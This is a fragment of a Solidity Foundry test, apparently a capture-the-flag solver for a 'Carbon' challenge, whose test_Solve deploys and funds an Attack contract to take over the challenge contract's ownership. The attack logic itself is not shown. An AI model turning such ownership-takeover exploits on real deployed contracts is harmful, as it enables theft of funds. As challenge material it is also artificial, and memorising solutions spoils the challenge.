...
contract Solver is Test {
	Carbon carbon;
	Setup setup;
	MyCertificateLibrary thelib;
	
	function setUp() public {
		setup = new Setup(address(this));
		carbon = Carbon(setup.challenge());
	}

	function test_IAmPlayer() view public {
		assertEq(setup.player(), address(this));
	}

	function test_IAmNotOwner() view public {
		assertEq(address(setup), carbon.owner());
	}

	function test_NoUnIntended1() public {
		try carbon.transferOwnership(address(this)) {} catch {}
	...
	function test_Solve() public {
		...
		Attack a = new Attack(address(this), carbon);
		address(a).call{value: 0.2 ether + 3 wei}("");
		a.attack();
		assertEq(carbon.owner(), address(this));
